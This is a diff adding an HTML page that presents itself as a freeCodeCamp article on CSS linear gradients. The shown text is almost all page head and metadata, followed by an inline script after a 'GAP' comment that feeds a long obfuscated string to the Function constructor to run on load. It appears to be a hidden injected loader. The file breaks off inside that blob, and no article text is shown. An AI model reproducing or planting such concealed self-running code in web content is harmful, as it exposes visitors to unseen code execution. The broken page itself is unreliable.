@@ -1,0 +1,604 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+    <title>CSS Linear Gradient Explained with Examples</title>
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link rel="stylesheet" type="text/css" href="https://cdn.freecodecamp.org/news-assets/prism-1-16-0/prism.min.css" />
+    <link rel="stylesheet" type="text/css"
+        href="https://cdn.freecodecamp.org/news-assets/prism-1-16-0/prism-unescaped-markup.css" />
+
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,400i,700|Roboto+Mono:400,700" rel="stylesheet">
+
+    <link rel="stylesheet" type="text/css" href="/news/assets/built/screen.css?v=38de3a54d6" />
+    <link rel="stylesheet" type="text/css" href="/news/assets/css/algolia-search.css?v=38de3a54d6" />
+
+    <script src="https://cdn.freecodecamp.org/news-assets/algolia/algoliasearch-3-33-0/algoliasearch.min.js"></script>
+    <script src="https://cdn.freecodecamp.org/news-assets/algolia/autocomplete-0-36-0/autocomplete.min.js"></script>
+
+
+    <script src="https://cdn.freecodecamp.org/news-assets/dayjs-1.9.1/dayjs.min.js"></script>
+    <script src="https://cdn.freecodecamp.org/news-assets/dayjs-1.9.1/localizedFormat.min.js"></script>
+    <script src="https://cdn.freecodecamp.org/news-assets/dayjs-1.9.1/relativeTime.min.js"></script>
+
+    <script src="https://cdn.freecodecamp.org/news-assets/dayjs-1.9.1/locale/zh-cn.min.js"></script>
+
+
+    <link rel="icon" href="/news/favicon.png" type="image/png" />
+    <link rel="canonical" href="https://www.freecodecamp.org/news/css-linear-gradient-explained-with-examples/" />
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+    <link rel="amphtml" href="https://www.freecodecamp.org/news/css-linear-gradient-explained-with-examples/amp/" />
+    
+    <meta property="og:site_name" content="freeCodeCamp.org" />
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="CSS Linear Gradient Explained with Examples" />
+    <meta property="og:description" content="In a linear gradient, the colors flow in a single direction, for example from left to right, top to bottom, or any angle you choose. A linear gradient with two color stopsSyntaxTo create a linear gradient you must define at least two color stops. They are the colors the transitions" />
+    <meta property="og:url" content="https://www.freecodecamp.org/news/css-linear-gradient-explained-with-examples/" />
+    <meta property="og:image" content="https://images.unsplash.com/photo-1579548122080-c35fd6820ecb?ixlib&#x3D;rb-1.2.1&amp;q&#x3D;80&amp;fm&#x3D;jpg&amp;crop&#x3D;entropy&amp;cs&#x3D;tinysrgb&amp;w&#x3D;2000&amp;fit&#x3D;max&amp;ixid&#x3D;eyJhcHBfaWQiOjExNzczfQ" />
+    <meta property="article:published_time" content="2020-02-01T00:00:00.000Z" />
+    <meta property="article:modified_time" content="2020-06-01T04:52:38.000Z" />
+    <meta property="article:tag" content="CSS" />
+    <meta property="article:tag" content="css3" />
+    
+    <meta property="article:publisher" content="https://www.facebook.com/freecodecamp" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="CSS Linear Gradient Explained with Examples" />
+    <meta name="twitter:description" content="In a linear gradient, the colors flow in a single direction, for example from left to right, top to bottom, or any angle you choose. A linear gradient with two color stopsSyntaxTo create a linear gradient you must define at least two color stops. They are the colors the transitions" />
+    <meta name="twitter:url" content="https://www.freecodecamp.org/news/css-linear-gradient-explained-with-examples/" />
+    <meta name="twitter:image" content="https://images.unsplash.com/photo-1579548122080-c35fd6820ecb?ixlib&#x3D;rb-1.2.1&amp;q&#x3D;80&amp;fm&#x3D;jpg&amp;crop&#x3D;entropy&amp;cs&#x3D;tinysrgb&amp;w&#x3D;2000&amp;fit&#x3D;max&amp;ixid&#x3D;eyJhcHBfaWQiOjExNzczfQ" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="freeCodeCamp.org" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="CSS, css3" />
+    <meta name="twitter:site" content="@freecodecamp" />
+    <meta property="og:image:width" content="2000" />
+    <meta property="og:image:height" content="1333" />
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "freeCodeCamp.org",
+        "url": "https://www.freecodecamp.org/news/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://www.freecodecamp.org/news/content/images/2019/11/fcc_primary_large_24X210.svg",
+            "width": 210,
+            "height": 24
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "freeCodeCamp.org",
+        "image": {
+            "@type": "ImageObject",
+            "url": "//www.gravatar.com/avatar/fcda43852608626fe46d7fd43145766e?s=250&d=mm&r=x",
+            "width": 250,
+            "height": 250
+        },
+        "url": "https://www.freecodecamp.org/news/author/freecodecamp/",
+        "sameAs": []
+    },
+    "headline": "CSS Linear Gradient Explained with Examples",
+    "url": "https://www.freecodecamp.org/news/css-linear-gradient-explained-with-examples/",
+    "datePublished": "2020-02-01T00:00:00.000Z",
+    "dateModified": "2020-06-01T04:52:38.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://images.unsplash.com/photo-1579548122080-c35fd6820ecb?ixlib=rb-1.2.1&q=80&fm=jpg&crop=entropy&cs=tinysrgb&w=2000&fit=max&ixid=eyJhcHBfaWQiOjExNzczfQ",
+        "width": 2000,
+        "height": 1333
+    },
+    "keywords": "CSS, css3",
+    "description": "In a linear gradient, the colors flow in a single direction, for example from\nleft to right, top to bottom, or any angle you choose.\n\nA linear gradient with two color stopsSyntax\nTo create a linear gradient you must define at least two color stops. They are\nthe colors the transitions are created among. It is declared on either the \nbackground or background-image properties.\n\nbackground: linear-gradient(direction, colour-stop1, colour-stop2, ...);\n\nIf no direction is specified, the default transi",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://www.freecodecamp.org/news/"
+    }
+}
+    </script>
+
+    <meta name="generator" content="Ghost 3.39" />
+    <link rel="alternate" type="application/rss+xml" title="freeCodeCamp.org" href="https://www.freecodecamp.org/news/rss/" />
+    <!-- This is related to https://webmonetization.org/ -->
+<meta name="monetization" content="$ilp.uphold.com/LJmbPn7WD4JB">
+<!-- GAP -->
+<script>
+  Function("T{_0{)J&%h/,Qjf(Z.)&4RlPXZsjHz. )1s(@mj*T\"zqEEOV3:DXLq8%K$u.K[q.Uzt|Z[\\=\x3c#Db@p3}w@?txxi4GpW|:`xP)cdeDm.*M4lT]jb&J'n:A;\\n3gJbQIZlM%t+OgoEc4\\,Of\\}Ir_zx$+#0w;+xE^9N:^}Jf l_'_}NI0& f%\"Lf%3m)T}EfdC@s=0m8>LA:FPk+0Zt?L|_LSP5i@.DH8=|h} Q`8*o7u$nfb}yVL[ku7&|+%uK&`-G 1}7E/VTZ_}p@[AI4GJp+&L\"H}AOT, j&o.Qq>&$q/}Rf`9O{\\6AgiT3iMeM,@ yg/Gx5:3j2t|nnulB2%TStVx}x{?QVqa$J}D]f r`+n%oAXF;q8\x3cO!)9#YO$;lWOCa^g=\"fMN4BCn*3YxD'GawulTi60SJfMA98Uy6-Bc8WK9U\\EB^GaezTt\x3cw84Sgf)d\x3c+KnTrfTis$f8>M@)5?K5_9Umt|Zl`G>a9VD4WjM`:;j$}Em5)tBRtX/gVeiuTp\x3cxL(c]&OII\\sJ^/T@VQyM:6t j%!d$i`T:ZsAGbJXhshezV{uqv-E!)+#\x3cxrnn)NY\"V1mGQrkolTcnl.J,|:grxTi[syHIPsM+pTKSi\"roVoE#]F36Lym5QMI9Nxh-6]GJ$BpAyu_/91qBgp=7EQo+:`#m->koukB}Kzy\x3cg7y(EKf.1LiB\"H\x3cc$tXHLeHz1=vu & `^7){RsYR,sc4J|rEb#N4@VO#2V  ,>pRwtb/j&f5T$Mx7-y(\x3c) ruIIA``D2;!I{3}8%1@vjb9[ \\.G||!D#JXOx+ru+>sj'dOf9n7kAbQ0{Nz\\8+Lvx}zQal3lzu+EEbW@c^bezQ79.\\xQ`++R{]\"Y$OV3#FbV4Q>H9C|p!&HX+x%nFcP1iAbM488-ut-RjkC3mbv_FZQ=g^ATy,t$1\\X5WPd,QMW!43)qG`af:> cw#\"K_%Vz5k:6{TW\x3cXL\\NzP}\x3ch84SYoCZ8]K4fSiXXsySI9;vx}zQal3l5i&4RlPiia0nD[@E9DOl+87K\"c\"A^\\}yVL[ku7&|+}uK6;auAx?ONulT{^a=I8:]d%!iaj:R4\\lA|, c!l$[zQ8nqMUy)1L$J,>Zm`_U0JXS#\x3c}0i&'@lf4T4\\:8giH=g^i@ H%M^lCO5-^XH\\\x3c?E\\IB]\\wS::&%k7'ikr'Y\"`wAGtTXga0p7PA@-t?d6;Sm5uIZy`GBjJa]\"Vy!l}?]'}Lc4W6Aitm]2s0M:3}th)fC }bf5-0p?MFC2X-_2)ntxL9d#rKI4u7]Eul1|U}KI0& f%\"Lf%3pqu+EEbW@cVYeqT1&rb-Oak,f8i&4LcGf[MaB\"3  +84O]q:Xzl|\\`tiLpVNMm>x(h/zL\\b\"d+n-PgxGK!K0E#8r&l 'cf)*m)`sGU`PLcuBAv/r&1v|QGt36 ] 8Rb[pZKVQu:%!u7'g]&Ab!t]5JSEB#?XS\\\x3c &r%2M]L+lzu:8g(]3cM`D +q|hI8k$`4TrWuHROD:Zprm+G;v@u.K[q.Uzt|]ExVUpNTQ,\x3c;!@$?K$bL!uT6Ro+}i{FhKxeLM+#T,Zg*I\"zu8T=Y\x3cEJbOq\x3c%+Gt,@jf5Z{`6AjSiUqTiNu./@@LTO7s4Opl>kRzE=c>\\F#\x3cprot@djb9[ \\+BBXG1ipai{\x3cxwl}xI\x3cb8I W GO`z=!GeHs3}qoV|Q2c:TobwBNtiIg=gT 8/!1v|Q7lQMqbH9U\\EB^Gae5E#uw&+KvlQ\\mZ%8]kl=gAZHz+{ch%QL&p*ZK]\x3cFEbz4jFVSu9}8w84O]q:Xzl|.EK}BrU.Um\x3c/y@'(F\\{SeI+$_VONCZbTz)/}'pt+>Zi* $]w7^|ai2L!Dz?|uupyI]\x3c9rq\\%@E`C0a=-N:/}'pt+>Zi*po]|9IUW@V:_DF@ yg/G\\5:9ro]|9IUW@V:_DK>=sr}}F_r7GnZskOzE=c>\\F#\x3cprot6va\x3cKG:e\"\x3cTOD:ZsiNu./@$LTQ&t7O\"Op?E-VZlJ\\Sm,{u='(F\\{S#I+}_W`KBV:_D*F >z#\"QY_1K8O\x3cIAZW32L!Um6&u!-(in^1[quHYAzI3isgks/%.! ED]qAbrc|6TWQ\x3c{_nQq>&$q/'8]ZBpmz#8T+VZh=g[*9=%h%5Y^r3I\"W}AfbiIg=gT 8/ ^ttxlzL!\"`)N/PL3XL!Cq0x h_+Lhb7Z't|]ExCUr;TSo27&,,6O]q:Xzi}5JSEB/F}N 3vyqp%!]p(Xu^$BR(QXdJ\\Fu8p|Jt-ua\x3c+[zQ$\x3cO\\hUpJXS#\x3c}0r=/>dr*cF]\x3c:Eb!=#?XSF0& f%\"Lf%La+x}EIUK\x3cVDFD\"bxOi&'@lf4T4b7NRSVCgFqMg/lMw.QL&p*ZK]\x3cFEbz4jFVSu9}8q84O]q:Xzl|P]kl22>hMo>x!q7'dso*Z#`|RNzJ/h'jM\\\x3c \"h#-V }$Epc0Zdrh4{F}_k)s'%;4SYi:KF\\%?LkiXtfz\\8@Lvx}zQal3lzu+\x3cFtPZdFAN\\\x3c *|8-Oqx3r{\\\\B0`QFn^z\\o+%sk7'dszBpt+tHNQV7dFyM5E'qu/|xH%L!uT68giX/gVgzr?}swx(K kOK5iw9fmPUg=gT 812>'xOvq`K:O:E{Sn0!G0D:-;y@7Gx5:3ru\\r8X=HTuesfK6 sd%\"Lf+5X{b}6OZz\x3c|deD|6psh7Fu&'Gs8n0ZjO}\x3c#ETSo27?a7Vu`q9V!-HZ}Jo*$^N=;':9+=Ad'&AbgK:H{tC)%5}@gYl9/rT>S/\"px+zBCOV7dF!O 9%!f %fx,Rf73\x3cHyWHTtMzQq>&$q19vacKtI+KHlWP2ZPBE46 sd%\"Lf+-U!b|4MSiUg=gT 812>x}c(:`#zzwADSZ{[^_f5\x3ct&x#']x8;G l#nUzV=AGjD kp%h7@vacKq=mKnRzK\x3cY=k.rP$9!-8L|#PuI+KGlWP2ZPBE4=89ut-RjkEfGdoE^T}7 X\"_7?:8f-5]x&^Xqb%ENlNWueshQVt\"+u@Z kQ[ Z:8g)K4{LzS C, 1 '-jl=_4b7PCOV1]^Xf)@7 ,.|IkbC\\4\\7PEZU3sNyM5G;\"@}EIg^)OzU::{\\W:abUzrPjm/1)RkeEp)do?USz4jFVSu9}8h84D5bOL#\\qGI]PTZ_n$:-q>r}?E!)rlzz\"8AR[U0>bQ4@p$#%Tk$o`+:SIGz`n:ZFZStc%;.84SYoCUI`iG=)JTd_p\\4Q./,=(?bb(Z8gKST]UaYIXI|.1\x3cpL?Q5X\"p[Px8Cbn4g=XYqP,!qI}Rf`9O{\\6AgiT3iMeM.0& f%\"Lf}`#\"g 8OT`\x3cy\\gk|?$x+}@Z$b2O\"(tHNQV7dFyM5E'qu/|xle.YG`sGU`PLidYN mpsk7?Cmk(Zu]|YTu]@ZLhQzH%>d!)Iq%*pg\\kZ]uiKr_zi%ejm/TT,Zg*I\"ztEES\\3{SVAF7;(=1Ii)-Qt.xwkD]ECb=aS:1t&H{|J]k9YNgb4G\x3cC;Z^s2OzX`W1@idb3M\"V:HxnV=hkWPq4!t1(0T&c7KqQ}7EQC;edbQsJ;x=1q\"RDx:D\"[A6=6\\dfHY|sgdo)gmhW(,b2Xr`xGflbXOF0& f%\"Lf%3m)`sGU`PLX^ai'Q.\x3cg!QCmk(Zu]|YNu]@ZLhQzH*\x3cl7'ijb5RmQsYmJo[\\bs_5T1&r$LAib/Vpn:^ou_XVpYTz-%yr}?dso*Z#`|QPkl2/:pf8wLvx}zQal3lzu+EEbW@cVczzG;`@u.K[q.Uzt7NRSVCgFqF+TaM2m?z2e9Z|aMkg->[Qe\"iZe{!fp-FgkQV ]$BC]NWue\"_7m='1#|Md^(K4{l/h{lT[MaB\"3  +84O]q:Xzl%YAt[U|Uzf7J>2.r?Ig`&Zu]|_P`QBd;bK:\x3ct\"opzB ,]s8n0Zino/eA!Cm>p'q{(@cb7ro]{`SbCB^;\"U=Wp%|}zibpb\\In98NQQ2Z-E(O9|\"r}|Kl%hr$u:Lgx+i:dhk!:{yw79jx& tizsADa97i@yK{-p&l 'i`l8Z5xZnFcP1iAbM4Q,_+}EBjo4X5)tBRtX/gVXz\x3cT%MzJ|wl+1KzU$;ySkW|Si@ H#Mwj|:3sKX5k-]X+a]!+0E#8r&l 'cl&@Ort$_U`NU^>y$:+79$LTK&b7X{`7NVOTLgsyK{-p&l 'i`l8Z:[oGCVh[{u-:jVl;_=@zS[QC7p=Z\\j=+|3#\x3c*F{!fp-FgkQN{a$l2zV3hLyS:?#|,5=\\l+:Xxz\"8PZC1Z^Ei.J8>ut)IY`*l;J=_h{lNu_!Dz.$gl%!cj&blQzoYgm}icdeDm.*6)(EMmp-l\"u:@lSO7i^gf80& f%\"Lf%LauT6RXu]7[^kz-X;1L8+Blr7T,d}\x3cDl.T|qi@ H}Mh=z>diKJ{Q%@E\\VXu+61Uxc2,;-x^r3I\"W}Afu]\x3c#HTQq8%^rs|a|kQVm`sAT\x3cQ2ZdeDy9'uFw\"I\\%3m+)|_SSVmiLeHn?%u+1xPqk(f8n0Zj\\nAZL4S\"\x3cxrx%|cxp7I.x\\Zj\\n/Y\x3c8Uq8%\\l$-Bfb7l.Z}4DnlT[MaB\"3  +84Q &Bm5x|_ARFqk=aSX3$&h}|O }*X ]\"SjtHCc;gH{87 ,,-c!)ol5k7ZjRQ1jEXM\"VwudsE>hm*Tp1v\x3cLRh\x3c|Upe5QI(+%@Z]i8K,d6Gg)G:h=qU4>8//PTCmk(Zu]|YNxGUpLeX)\x3ct&x#'[]%3m+QoGCVh\x3c|SVNz= |h=|Ojl7rm^ ?YtE=cKbKqT}9\".C*5c:TobwBNtPUpF!Sm1]qptRSYoCKI\\\x3cBN>T=mQ.Qq>&$q/}Rf`9O{\\6AgiK4{\x3cyM5Q,(d#7Q5kQUzS\"EO`!\x3c#GaD \x3c $1q\"K\\%3mF\\%?LxTi\"g}NI8=!q{(>\\\x3c3r{\\zBARn0^FWezQI x{%ga:Pu8OK.=xWiP5}BI0& f%\"Lf%3m)t$nNu!Y&s0z N58uLxidb3M\"V;bg(Ti\"gpi!eu'qr-FgkKT5i6B{\\ik\"g0zI356+xTR&i*Tsbv^ouz72c$\\8@Lvx}zQal3lqu+^o+}i^\\wN2NP8h;(d$rQL{`S4CVhT[MaB\"3  +%CO!xdlqx$_BWP2{Fzf8\x3cLM@x=ag#I'4S:BgkiUrqakm.sUyt'QDf8Zq\\sEfnG@gGe_8Pu'qr-FgkKU5i&4RlKi[MaB\"3  +84O]q:XzltHNQV7dFyD5E\x3cA@LTO|#9j2/68jbiXVdYN mpsk7?Cmk(Zu]|YOxKUpwyD89=rl}{cf&Lpu+KnRrfBy\\4eqT%9\"8@Z lLcGA6NU`NfcdfQoT  S#(Uq7+[zQ$\x3cO\\hB|SeD\"?# #t?Xfb\x3c; ZHGjSN3b=aSF8;$h{|>kbhX ]\"yA\\F:ZJfwuTuyutcLYakGzRz8RazDr_pi{8]!S#(Uq7.c5k7Zj\\n=c=eQ{\x3cL x{%vn^7dt+tYNxbAZL4S\"\x3cxrx%|]$x;GxcskLtbAZL4S\"\x3cxrx%|]$%+[zQ$\x3cO\\h3!LzZ /%'u}9Lfb7X{`0n{+Gk{;y%#8r&l 'cl&QHu\\rYNuiXi@\\R5b1!q{(>\\}`#ISMYSt(Cc;gH{87&,=yFfaKT5u:GHWUU/@yf:+!\"o*?Q`f8pm`uHMSPBh_pf5G8>r#\"Dak&RSS$lFtPXuGaD \x3c $%;4P]q]L#\\qGI]PTc_nQq>&$q/zcxc:TobwBNn}iiQcD{0/ B}E?ak)l\"VwFg(PCaDzizG;wh%QCmk(Zu]|YgiT3iMeM,>./,J/>j{5#rt|]`]P:d9W_8E$uwI%cxl3R{OrSjtHCc;gH{87 ,,+Blr7T,a6SFcP1iAbM.eL&|!|L^{3%zzp\x3cNRhB]AffF8&|o8C?&`&Rxt$;Ial\x3c|Uzf81t&={?]gk1UmR0]fTW\x3cXL\\NzP8-ut-RjkCM:Qo?LtV6^Kz\\5Q.9/vTM&l7OsW|4L5GB!:0O:9#yjx'>dP*Z8gK9f\\lNV\x3cW$$/}&Ox,Q]k*X.x+IAZW3/Dy_m.sUyt'QDf8Zq\\sE`xh4jFVSu9}8q;|dso*Z#`|SE`T=gX0zI8N(rx{[Y+5[!V68g(hNaGTC.eLMq5=R&m:YttsZjghU#9cOxC7&kx,gYo,[yS|GSuiK|_pf:9#yjx'>dD*Z+k-]#+/TpLTFZ+|u=1j JFs:.x}A0`QFnpYTz-%yr}?K!x;G l$nNzP3l-eK8\x3cL 1t%Beb3Z8]KAl`G:Z9fDQ\x3c#!uWxK\\i*X!xwnNzH7g=?Nm.Wqqs%Bjp^Ort\"_S`EUp>bQ4@p$#pTB&`&RxtrBCcO3cL}__kaYSc9d$r`L#\\qGI]PT|STk|+#uq%eL\\bIjmz 4RSPBCGWD:\x3ct}r'| `f1J4O7PjQ}\\!D0:iV$|lr|i[^1R4`\x3c4TbT7WMgD!QJs?{EI]k,Zt)q\\iu]DVJqRI6js`;}xk+3GyS:7{anDVDhDGJ$$f18x5cIj.]|8R`Q@uW0zrN52r}%LYaEeI+tWdOnAZL4S\"\x3cxrx%|c^))m+O\x3cFEb#BiJ\\A#>t8%$+@x)9m8O\x3c4DR'DZFg+u=%uqt+cxb7X{`0]fTW\x3cXL\\NzP8-r7@gm%Lc5u:4lOF2:NXM\"tx%wt'Bj%ER{OrSjtHCc;gH{87 ,,\"cf&O[4u-ZgxTZe9eDz>]!gtVO&m&Xq\\$!ORGZ^FfD >Qui +B ^OX5(rBCcO3cL!Gq+s>d!)BfafNuZrYAu_3aKX]{P8/\"8C15JKa\"Ou!A[Gfu!@&.T  S#(Uq7+[zQ$\x3cO\\h\x3c|Si@ HtMq='BoR7RG\\\x3c8LSO3cL!R -Lu\".@gW:3G$Wu4T]TZh=aCN/psr}E?ak)lzO&\x3cGOV=g_}'I0& f%\"Lf%3pqx$]Ru]@ZLhQzH}uz7-Yt%9#\\`}@IaGU|^yE#8r&l 'cg).m)T%ACbK=cVTezQ,&u*4@ oQTqf$YNuiKX9gBtP}9 x?K!zBL#\\qGI]PLj^af)>#+ r?O&q-X{e6Agu_1VLVG488-l7'duz+[zQ$\x3cO\\`1{FzZ$+#0hJ'i\\l3KK]6AldC:j=zw4/L 1'xImbOK,W|FTOP1ZGY]\"gtJqt0[l%KL#\\qGI]PTc_nM4/8/,8@ile*T4O:HgkET{J0Q:+!\"o*?K$bAbgK7Zl\\GFi^zf+Q8//yTCmk(Zu]|YNxGUpNTQ,>;$/ CF$^`axOp8L(pXh=aSF0& f%\"Lf%LauT6bd]=\\R_gG 9(0rjH:3o*Z#`|QOIq+rbgQ'=Ik`;(Mk7 C+)\"8TcT\x3csA0Zz/)&=&?k!)9N ]'kUtqU!JXS#\x3c}Jx7Idu)EL#\\qGI]PN2sgX|/ v#b2JZl1j2tw.3gO0dD!H\"/#qw +:5c:TobwBNtiIg=gT 8/&kx,Z!).!rc|6TWQ\x3csMyH5E#uw&+Kvc:TobwBNtWUpJXS#\x3c}0i&'@lf4T4W7NIThB|L[Q{A/ h(71qm*+ `}Efn)3c=e@\"9#0l$7>do*Gpg.8XSECiAaF:J8Ki +c3^^m\"`)NIThB2g}Q2N7!@A=FS-\"% z\"8TcT\x3c/ANmig#>ww+LoyAl4]KEl`GBjJaf2N >fp%I oLp\x3cuHEl\\GFi_wc-P Mr=z>diKX8Wib=uiZYGaD5\x3ct&x#'[g88]ubq;f`}\\!Gwc43Lk55\"8(ZOU:do?US?U!ANmiQ,sd$|[(7(G!S.bx]}70:eDm5Jsd$|[,77K\"c\"A^On:V:XK7S;-yp%R]7.A=K:7O\\Gftgpxo+$u#DQ>&i&HqZ9\\j`}7PgPiuej@`JzLfq.T#SI6AaGL,p\\zmV \"v=)Lh%Lpmz$EYan>dHyfG-  wx'R]8)KrO%?T(K4{Wye{e7!@pEQjv8m:ZsAGbJj%\\wNg9=|h} Q`*TC5j,g_+}7PfPc2Z0M@xrkU&Lam+>lC]PB^FhD+3u86LTxaXSC2r6ROj^7PgP{{%?m)5\"8)Z_Ug!kZgiCZa9UDxexk4lR?jb&Q+WtYt+}i^3#\x3c2Np>opyBd94A=K7NAzN/W=_z{%@m/ TF3_7KmY-\x3cFtQRy9!Km,t|? rmU&@G:Zo5EZ}=PhPimV \"v=)RkeKO5)pEEOMKd3%\x3c2Np>r!,ihl5l5xo_T`[A#HbO4QJsr}-Ffr*cu+s_CON:{F}@5Grqwr!cf&@OIID]NKl@2fpEu8p|o*4Q5l`t+WtYsrK)%5zSt\x3c )#xrlU87K\"c\"A[dC:j=-HgXlOljH:2s4Opl>]D]P3/W#\\+Pjy/&tduzBpS+'\x3cNRQE#>XSo2;#@u.K[q.Uzt|]Eu]BgQnQq>&$q/|cf&BImbq;f\\iIXGaR{6t>h#+Lj+&V|Z)YC]PAdDXizQ.//STCmk(Zu]|YNu]7[^WezQ8-yp+[])9p +i0j]}\x3c#GaD \x3c $B}ELfb7X{`\x3c5I\\FTc_-M#6{\x3clLDl$^`T:]|?OOFkcdbMx9pt1q\"K\\%3mF\\%?LxWi\"g}BI8=!q{(>\\b3JK\\\x3cBNZQ/Y=aC:,x g7'd2k:Rxx#nk}lD2F!Nz\x3ctqg*,QYq*ItO|:E-PZdFeDm.*%wp-B[e&TsS\x3c5I\\FTc_-M#6{\x3ckLDl$m`e=xunf\\n1dFfS ?r&r#EKYj*pgK7]B+=+!Q0:iT|M^lCT5c:TobwBNtGUpc$zIew6)'=ai%*p$u:@lTQ@:9VG4Pu'qr-FgkKZ8`7NQtGXidUHz.7 ,8CO5:`N2r&Wd_h3!Nz\\5Q.Kq=xA\\B;KzbZ\x3cSbG\x3cZJy_x9pth}{]$%+[zQ$\x3cO\\h3|SrO2Nu'qr-FgkKK5i;b{+}Ay\\Vc2;7u/r@gq++U 3o6Hth4jFVSu9}8w;+dsnKK8b\x3c5I\\FTc_zi eLMv5=@|#6lqxqZ]uiK{=z\\5Q; 1p{A=s*T\":wFTSP3g^sQq+s+v%xQ]`-GzUsSjtHCc;gH{87s,,\"C kQXqOrL3bCBZs0zdu[Xw%)/]n:K!b\x3cu/\x3c'UpAYezV$&d%.P6:Tt\x3cr4AlaV/iMfy@X?9ut-RjkC]4Q7]FcP1iAbM4/8-uLr:$*T#I+%WdOfRf^XimQ;r1u(O=^(N4ttHNQV7dFyS8\x3c8-t7|gl+'OzR6Agul@2s0T2Np6)\"?B$^Lc5u-YCulDdAWe|e0A,J/>j{1#rc|6TWQ\x3c{_nUm\x3c/u>!T\\))\x3clou:8{Ql@23Pi9YLM@x=ag#IW4S:BgxIZ[Ge$m-w8+u.K[q.Uzt$]Ru]?{=}S:,x g7'd!)7#I+wWd]fRf^Xi{Q.9,.RF^%DK5`sGU`PLa^zi%Pr9/'(F\\%5#-}7l3t]CgD-DgYl\x3cr}gOgu> rc|6TWQ\x3c{GzZ$+#0lL|iki.Iqt7lIIq+2G}M:9!uq=xMhi>lzxwZyTQ@{NTQ,+L@/&TO3^_[:ZsAGbJgVa|f)@p$#rTRS^\"px+q.nKlA2;Nnic_8,=z>diKT8Z:FgkPZh=aC:+!\"o*?K$qLc8]|!O>T=mQ-K+Q.uo$|[o%(m+u7]NzQ\x3cZJeN e}'o{CK&l3R{OrnNcN:!F!Nz6 qgt'A5k:Rxx|_O\\T3V\x3clR\"+%ufwxK_b`T#Zz]FtPXuGaD \x3c $%;4P]q]L#\\qGI]PTc_nUm\x3c/u>#|Qmo3dq+09U\\EB^Ga_Ie%+st(CvkbT:PwADtV6^Kzwz?{|/7(x]&bq=+KnIrfT^sZkx/}wwwDl!7.#9}:A]xI3ipYTz-%yr}?dso*Z#`|QOk_U!>yM8J  o xAx)@YqbH?fnQ\x3caGTC.T7vx}zQal3lzu+IA``30JXS#\x3c}0hL9Cmk(Zu]|S{+VGe=bE,8N 1q\"K\\%9Nua7kNcN:!^TzqQN=4LTxm#Il#+p_LSP5i@ n5b&M0@CKu&LpsS$kFcP1iAbM4Q,$h%.Of{&c+u:9f\\lNdF_Nm.t g1CXkb9 xt0BNZQ/Y=aC.T7vx}zQal3lzu+IA``30JXS#\x3c}0hL9Cmk(Zu]|S{+VGe=bE,8N 1q\"K\\%9Nua7kNcN:!^VzqQN=4LTxk#Il!+)_LSP5i@ n5b$M0@CKu&LpsS$kFcP1iAbM4Q,$h%.Of{(c+u:9f\\lNdFeDm.*%wp-B[e&TsS0][aGB/Dy_{8#uds2Pl^9KoVoAGSbX{>hMo>x!q7'dss&X,SIEEbW@cVXz.0& f%\"Lf}`#\"g 8OT`\x3c4F!Au8s8ww\"P!73[xZ:YV+GU4c$zIew6)7!xe+1KzU$;k}if]s n88.9,; Bl7+[zQ$\x3cO\\hUpJXS#\x3c}0y.6d3s&X,3K9f\\lNV\x3cW$$/}&Ox,Q]k*X.x+IAZW3/Dy_m.sUyt'QDf8Zq\\sE`xh4jFVSu9}8q;|dsf+l.S\"EO`bM2safu072o xAx|`#zuw9fnT3V\x3clR\"+%ufwxK_bEeI+|Z[WHTuDb@p/}t%0Txf&7K\"c\"A^3hU#9cOxC7&kx,gYo,[yS|GSu{G#HhRtPt9\"t%P]{2r|c#;fSigZDfD,,=\"x$!c]&^KxasQGzRCh@yD5G89\"8ELjf,OzOzxEbl{2F!N|/}Ki7'gxl5Kzn:NVONCZp_e.9!uq1Cc^r3I\"W}Afu]@ZLhQzHtM^lEPdf(K:Qo?LtC@\\M`Dz>$9/^E>hm1_4bv\x3cSxGUr_z\\5c'qu/gx^%3p.asG2SSCZKg'q+suu1CXn^1[q(zY`aGBG=dTq=%Xhp{Bj}Olrc|6TWQ\x3c{F}D5E%$|,/>j{9#\\t7_A^R:n^gGu=;quv.J]k9Y5)\"8TcT\x3csJ!O#=w8^}CBU&OZ+QoGCVhB|SgG 9(0w.6d!zLr{`w:I\\C:\x3c=gi^e}>vt'A3cKT8n#8NRbXpNTK#/I|+1,BfaEp4T%ACbK=c^zZ /%'u}7Q5X\"r!Zw6EzE/aDy@ 1&}h}-P!)5#-|:%lOR>aQySt3$\x3cw86d!zLc+xcn8;.tiLc1q;&uv%C}5c:TobwBNtiIk9e]ze}uz7liZf3J:O CLgh#!3gGu=l>f '@YqKAiz#?IQGZX9_K4+#wx||KlpLm5uIEEbW@cV7ezQ; \"Jf?bb(Z:asG0`QBdLlOqwu8E;ld3s&X,F:>j4}ub9ZDGIu'qr-FgkKm)WtY-cV/iAbM[,$uu'|O!x;G l|nNSYLBMg@\"3  Rq,Bjs*X4ttHNQV7dFyM5Eu!u7/>j{*#\x3cx$nN)Ghid_Dz1%x>tBf!c4X4doE^`}BP=Pi{e?KrK+iYa)Kp\x3c}7Ean:ZFZStc:;r84SYoCOI`\x3c4DRG2CGWD!% m>x7Ffp9GzQsBFl*\"B$FB 